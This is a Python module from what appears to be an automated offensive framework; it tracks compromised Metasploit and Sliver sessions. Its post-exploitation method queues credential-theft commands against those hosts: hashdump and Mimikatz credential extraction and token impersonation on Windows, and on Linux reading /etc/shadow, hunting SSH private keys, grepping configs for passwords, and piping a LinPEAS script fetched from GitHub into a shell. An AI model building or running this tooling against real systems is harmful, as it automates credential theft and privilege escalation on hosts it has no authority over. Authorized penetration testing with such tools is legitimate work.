"""Session Manager - Tracks active shells/sessions across MSF and Sliver"""
import logging
from typing import Dict, List, Optional
from datetime import datetime, timezone

logger = logging.getLogger(__name__)


class SessionManager:
    """Centralized session tracking across MSF and Sliver"""
    
    def __init__(self):
        self._sessions = {}  # {scan_id: [sessions]}
    
    def register(self, scan_id: str, session: Dict):
        """Register a new session"""
        if scan_id not in self._sessions:
            self._sessions[scan_id] = []
        session["registered_at"] = datetime.now(timezone.utc).isoformat()
        session["active"] = True
        self._sessions[scan_id].append(session)
        logger.info(f"[SESSION] New {session.get('type','?')} session on {session.get('host','?')}")
    
    def get_sessions(self, scan_id: str) -> List[Dict]:
        return self._sessions.get(scan_id, [])
    
    def has_active(self, scan_id: str, host: str = None) -> bool:
        sessions = self._sessions.get(scan_id, [])
        if host:
            return any(s.get("active") and s.get("host") == host for s in sessions)
        return any(s.get("active") for s in sessions)
    
    def get_post_exploit_actions(self, scan_id: str) -> List[Dict]:
        """Get recommended post-exploitation actions based on active sessions"""
        actions = []
        for session in self._sessions.get(scan_id, []):
            if not session.get("active"):
                continue
            
            platform = session.get("platform", session.get("os", "")).lower()
            
            if "windows" in platform:
                actions.extend([
                    {"action": "hashdump", "module": "post/windows/gather/hashdump", "session": session["id"], "priority": 1, "desc": "Dump password hashes"},
                    {"action": "exploit_suggest", "module": "post/multi/recon/local_exploit_suggester", "session": session["id"], "priority": 2, "desc": "Find local privesc exploits"},
                    {"action": "mimikatz", "cmd": "load kiwi; creds_all", "session": session["id"], "priority": 1, "desc": "Extract plaintext creds"},
                    {"action": "token_impersonate", "cmd": "use incognito; list_tokens -u", "session": session["id"], "priority": 3, "desc": "List impersonable tokens"},
                ])
            elif "linux" in platform:
                actions.extend([
                    {"action": "enum", "cmd": "id; uname -a; cat /etc/passwd", "session": session["id"], "priority": 1, "desc": "Basic enumeration"},
                    {"action": "linpeas", "cmd": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh", "session": session["id"], "priority": 2, "desc": "LinPEAS enumeration"},
                    {"action": "ssh_keys", "cmd": "find / -name id_rsa 2>/dev/null", "session": session["id"], "priority": 1, "desc": "Find SSH private keys"},
                    {"action": "creds", "cmd": "cat /etc/shadow 2>/dev/null; find / -name '*.conf' -exec grep -l 'password' {} \\; 2>/dev/null", "session": session["id"], "priority": 1, "desc": "Search for credentials"},
                ])
        
        actions.sort(key=lambda x: x["priority"])
        return actions
